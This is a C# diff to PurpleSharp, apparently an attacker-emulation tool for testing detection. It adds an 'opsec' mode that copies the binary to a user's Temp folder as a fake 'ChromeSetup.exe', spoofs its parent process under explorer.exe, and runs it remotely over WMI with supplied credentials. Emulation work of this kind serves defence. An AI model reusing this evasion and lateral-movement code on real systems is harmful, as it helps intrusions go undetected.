@@ -1,5 +1,8 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Diagnostics;
+using System.IO;
+using System.Management;
 
 namespace PurpleSharp
 {
@@ -21,6 +24,7 @@ namespace PurpleSharp
             usertype = hosttype = protocol = type = 1;
             nusers = nhosts = 5;
             bool cleanup = false;
+            bool opsec = false;
             technique = tactic = rhost = domain = ruser = rpwd = "";
             command = "ipconfig.exe";
             pwd = "Summer2019!";
@@ -85,6 +89,10 @@ namespace PurpleSharp
                         case "/cleanup":
                             cleanup = true;
                             break;
+
+                        case "/opsec":
+                            opsec = true;
+                            break;
                         default:
                             break;
                     }
@@ -99,9 +107,32 @@ namespace PurpleSharp
                 }
                 
             }
+            if (rhost == "" && opsec)
+            {
+
+                //Write.Console
+                //Launcher.SpoofParent(3568, "C:\\Users\\labz\\Desktop\\Test.exe", "");
+                Process[] pr = Process.GetProcessesByName("explorer");
+
+                string fullusername = GetProcessOwner(pr[0].Id);
+                Console.WriteLine(fullusername);
+                string shortuser = fullusername.Split('\\')[1];
+                Console.WriteLine(shortuser);
+
+
+                Process process = Process.GetCurrentProcess();
+                string fullPath = process.MainModule.FileName;
+                Console.WriteLine(fullPath);
+                string path = "C:\\Users\\" + shortuser + "\\AppData\\Local\\Temp\\ChromeSetup.exe";
+                Console.WriteLine("Copying binary to appdata temp " + path);
+                File.Copy(fullPath, path);
+                Launcher.SpoofParent(pr[0].Id, path, "ChromeSetup.exe /technique " + technique);
+                return;
+
+            }
             if (rhost != "")
             {
-                ExecuteRemote(rhost, domain, ruser, rpwd, technique);
+                ExecuteRemote(rhost, domain, ruser, rpwd, technique, opsec);
 
             }
             else 
@@ -112,13 +143,35 @@ namespace PurpleSharp
             
         }
 
-        public static void ExecuteRemote(string rhost, string domain, string ruser, string rpwd, string technique)
+        //https://codereview.stackexchange.com/questions/68076/user-logged-onto-windows
+        public static string GetProcessOwner(int processId)
+        {
+            string query = "Select * From Win32_Process Where ProcessID = " + processId;
+            ManagementObjectSearcher searcher = new ManagementObjectSearcher(query);
+            ManagementObjectCollection processList = searcher.Get();
+
+            foreach (ManagementObject obj in processList)
+            {
+                string[] argList = new string[] { string.Empty, string.Empty };
+                int returnVal = Convert.ToInt32(obj.InvokeMethod("GetOwner", argList));
+                if (returnVal == 0)
+                {
+                    // return DOMAIN\user
+                    return argList[1] + "\\" + argList[0];
+                }
+            }
+
+            return "NO OWNER";
+        }
+
+        public static void ExecuteRemote(string rhost, string domain, string ruser, string rpwd, string technique, bool opsec)
         {
             string uploadPath = System.Reflection.Assembly.GetEntryAssembly().Location;
             string executionPath = "C:\\Windows\\Temp\\PurpleSharp.exe";
             Lib.RemoteLauncher.upload(uploadPath, executionPath, rhost, ruser, rpwd, domain);
             System.Threading.Thread.Sleep(3000);
             string cmdline = "/technique "+ technique;
+            if (opsec) cmdline = cmdline + " /opsec";
             Lib.RemoteLauncher.wmiexec(rhost, executionPath, cmdline, domain, ruser, rpwd);
             System.Threading.Thread.Sleep(3000);
             Lib.RemoteLauncher.delete(executionPath, rhost, ruser, rpwd, domain);
